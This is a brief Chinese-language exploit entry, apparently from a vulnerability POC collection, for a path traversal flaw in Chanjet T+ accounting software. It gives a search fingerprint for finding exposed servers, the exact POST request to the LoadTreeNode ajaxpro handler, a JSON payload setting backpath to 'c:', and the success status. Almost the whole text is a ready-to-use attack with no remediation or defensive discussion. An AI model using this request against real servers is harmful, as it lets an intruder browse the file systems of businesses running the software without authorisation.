# 畅捷通T+LoadTreeNode存在目录遍历漏洞

用友 ｜ 路径遍历 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/ajaxpro/ASP.sm_setupaccount_versionupdate_selectbackupfileonserver_aspx,App_Web_selectbackupfileonserver.aspx.1cbd2a00.ashx?method=LoadTreeNode HTTP/1.1`

**Payload**
```
{"backpath": "c:"}
```
- **响应特征**：200